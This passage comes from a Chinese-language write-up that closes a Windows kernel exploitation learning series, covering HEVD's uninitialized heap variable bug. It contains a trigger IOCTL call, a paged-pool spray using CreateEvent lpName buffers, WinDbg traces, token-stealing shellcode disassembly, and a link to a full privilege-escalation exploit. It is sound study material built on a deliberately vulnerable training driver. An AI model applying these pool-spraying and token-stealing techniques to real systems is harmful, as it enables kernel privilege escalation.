    [+] UserValue: 0xBAD0B0B0
    [+] UninitializedHeapVariable Address: 0x97EF4AB8
    [+] Triggering Uninitialized Heap Variable Vulnerability
    [+] UninitializedHeapVariable->Value: 0xBAD0B0B0
    [+] UninitializedHeapVariable->Callback: 0x8D6A3D58
    [+] Uninitialized Heap Variable Object Callback
    ****** HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE ******
我们尝试传入不同的值观察是否有异常发生
    VOID Trigger_shellcode()
    {
        DWORD bReturn = 0;
        char buf[4] = { 0 };
        *(PDWORD32)(buf) = 0xBAD0B0B0+1;
        DeviceIoControl(hDevice, 0x222033, buf, 4, NULL, 0, &bReturn, NULL);
    }
我们在调用运行效果如下，这里被异常处理所接受，这里我们Callback有一个值，我们查看之后发现是一个无效地址，我们希望的当然是指向我们的shellcode，所以就需要想办法构造了
    ****** HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE ******
    [+] Pool Tag: 'kcaH'
    [+] Pool Type: PagedPool
    [+] Pool Size: 0xF0
    [+] Pool Chunk: 0x9A03C430
    [+] UserValue: 0xBAD0B0B1
    [+] UninitializedHeapVariable Address: 0x8E99BAB8
    [+] Triggering Uninitialized Heap Variable Vulnerability
    [+] UninitializedHeapVariable->Value: 0x00000000
    [+] UninitializedHeapVariable->Callback: 0xDD1CB39C
    Breakpoint 0 hit
    8d6a3e83 ff5004          call    dword ptr [eax+4]
    0: kd> dd 0xDD1CB39C
    dd1cb39c  ???????? ???????? ???????? ????????
    dd1cb3ac  ???????? ???????? ???????? ????????
    dd1cb3bc  ???????? ???????? ???????? ????????
    dd1cb3cc  ???????? ???????? ???????? ????????
    dd1cb3dc  ???????? ???????? ???????? ????????
    dd1cb3ec  ???????? ???????? ???????? ????????
    dd1cb3fc  ???????? ???????? ???????? ????????
    dd1cb40c  ???????? ???????? ???????? ????????
## 构造堆结构
现在我们已经有了思路，还是把Callback指向shellcode，既然上一篇类似的问题能够栈喷射，那这里我们自然想到了堆喷射，回想我们在池溢出里堆喷射所用的函数`CreateEventA`，这里我们多研究一下这个函数，要知道我们这里是分页池而不是非分页池，如果你用池溢出那一段申请很多Event对象的代码的话，是看不到一个Event对象存在分页池里面的(并且会蓝屏)，但是函数中的`lpName`这个参数就比较神奇了，它是分配在分页池里面的，并且是我们可以操控的
    HANDLE CreateEventA(
      LPSECURITY_ATTRIBUTES lpEventAttributes,
      BOOL                  bManualReset,
      BOOL                  bInitialState,
      LPCSTR                lpName
    );
为了更好的理解这里的利用，让我们复习一下 Windows 7 下的`Lookaside
Lists`快表结构，并且我们知道最大块大小是0x20，最多有256个块(前置知识来自Tarjei Mandt的Kernel Pool
Exploitation on Windows
7文章)，这里要清楚的是我们是在修改快表的结构，因为申请池一开始是调用的快表，如果快表不合适才会去调用空表(ListHeads)
    typedef struct _GENERAL_LOOKASIDE_POOL 
    {
                    union{
    /*0x000*/                   union _SLIST_HEADER ListHead;
    /*0x000*/                   struct _SINGLE_LIST_ENTRY SingleListHead;
                    };
    /*0x008*/        UINT16         Depth;
    /*0x00A*/        UINT16         MaximumDepth;
    /*0x00C*/        ULONG32        TotalAllocates;
                    union{
    /*0x010*/                   ULONG32 AllocateMisses;
    /*0x010*/                   ULONG32 AllocateHits;
                    };
    /*0x014*/        ULONG32        TotalFrees;
                    union{
    /*0x018*/                   ULONG32 FreeMisses;
    /*0x018*/                   ULONG32 FreeHits;
                    };
    /*0x01C*/       enum _POOL_TYPE  Type;
    /*0x020*/       ULONG32        Tag;
    /*0x024*/       ULONG32        Size;
                    union{
    /*0x028*/                   PVOID AllocateEx;
    /*0x028*/                   PVOID Allocate;
                    };
                    union{
    /*0x02C*/                    PVOID FreeEx;
    /*0x02C*/                    PVOIDFree;
                    };
    /*0x030*/       struct _LIST_ENTRY ListEntry;
    /*0x038*/       ULONG32        LastTotalAllocates;
                    union{
    /*0x03C*/               ULONG32 LastAllocateMisses;
    /*0x03C*/               ULONG32 LastAllocateHits;   
                    };
    /*0x040*/        ULONG32 Future [2];
    } GENERAL_LOOKASIDE_POOL, *PGENERAL_LOOKASIDE_POOL;
我们还需要知道的是，我们申请的每一个结构中的`lpName`还不能一样，不然两个池在后面就相当于一个在运作，又因为pool
size为0xf0，加上header就是0xf8，所以我们这里考虑将`lpName`大小设为0xf0，因为源码中我们的堆结构如下：
    typedef struct _UNINITIALIZED_HEAP_VARIABLE {
            ULONG_PTR Value;
            FunctionPointer Callback;
            ULONG_PTR Buffer[58];
    } UNINITIALIZED_HEAP_VARIABLE, *PUNINITIALIZED_HEAP_VARIABLE;
我们可以确定回调函数在 +0x4 的位置，放入我们的shellcode之后我们在利用循环中的 i 设置不同的 lpname 就行啦
    for (int i = 0; i  g
    ****** HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE ******
    [+] Pool Tag: 'kcaH'
    [+] Pool Type: PagedPool
    [+] Pool Size: 0xF0
    [+] Pool Chunk: 0x909FE380
    [+] UserValue: 0xBAD0B0B1
    [+] UninitializedHeapVariable Address: 0x97E80AB8
    [+] Triggering Uninitialized Heap Variable Vulnerability
    [+] UninitializedHeapVariable->Value: 0x00000000
    [+] UninitializedHeapVariable->Callback: 0x00371040
    Breakpoint 0 hit
    8d6a3e83 ff5004          call    dword ptr [eax+4]
    1: kd> !pool 0x909FE380 // 查看池布局
    unable to get nt!ExpHeapBackedPoolEnabledState
    Pool page 909fe380 region is Paged pool
     909fe000 size:  1e0 previous size:    0  (Free)       AlSe
     909fe1e0 size:   28 previous size:  1e0  (Allocated)  MmSm
     909fe208 size:   80 previous size:   28  (Free)       NtFU
     909fe288 size:   18 previous size:   80  (Allocated)  Ntf0
     909fe2a0 size:   18 previous size:   18  (Free)       CMVI
     909fe2b8 size:   a8 previous size:   18  (Allocated)  CIcr
     909fe360 size:   18 previous size:   a8  (Allocated)  PfFK
    *909fe378 size:   f8 previous size:   18  (Allocated) *Hack
            Owning component : Unknown (update pooltag.txt)
     909fe470 size:  1d8 previous size:   f8  (Allocated)  FMfn
     909fe648 size:  4d0 previous size:  1d8  (Allocated)  CIcr
     909feb18 size:  4e8 previous size:  4d0  (Allocated)  CIcr
    1: kd> dd 909fe470-8 // 查看下一个池
    909fe468  41414141 000e0000 063b021f 6e664d46
    909fe478  01d0f204 00000000 0000032e 00000000
    909fe488  909fe488 00000000 00000000 87ac918c
    909fe498  00000000 00000000 00018000 00000040
    909fe4a8  00000001 0160015e 909fe4e8 002e002e
    909fe4b8  909fe4e8 00000000 00000000 00000000
    909fe4c8  00000000 00000000 00000000 00000000
    909fe4d8  00000000 00000000 00000000 00000002
    1: kd> u 0x00371040 // 查看shellcode位置是否正确
    00371040 53              push    ebx
    00371041 56              push    esi
    00371042 57              push    edi
    00371043 60              pushad
    00371044 64a124010000    mov     eax,dword ptr fs:[00000124h]
    0037104a 8b4050          mov     eax,dword ptr [eax+50h]
    0037104d 8bc8            mov     ecx,eax
    0037104f ba04000000      mov     edx,4
提权效果如下，详细的代码参考[这里](https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/Uninitialized-Heap-Variable/UninitializedHeapVariable/UninitializedHeapVariable.c)
# 0x03：后记
到这里我的Windows Kernel
exploit系列也就结束了，这个过程比较艰辛，也阅读了许多的资料，其实有些地方我也搞的不是很懂，但我一般的方法是如果一天对这个问题没有丝毫的进展，我就不会再去死磕了(貌似是坏习惯?)，因为后面我还是继续学内核，学到后面一些知识以后说不定这里的问题就豁然开朗了，当然前提是没有忘记这个问题，其实有些漏洞的篇幅可能比较短，有些地方的措词和代码可能不是很好，也可能有一些错误存在，希望读者大大们多多包容，也希望初学者能够自己去阅读资料把exp调试出来，其实有些地方我也适当的进行了省略(比如这篇为啥用的是CreateEventW函数喷射而不是CreateEventA)，需要你自己多多去尝试思考，非常感谢wjllz师傅以及Sakura师傅，给了我很大的引导，当然这并不是获奖感言啥的。。。只是对自己这一阶段的总结，自己对内核的研究也并不会结束(其实是刚刚开始)，越来越意识到自己要学的东西很多，还是慢慢努力吧，最后说一句，这不是教程，只是我分享的一个学习过程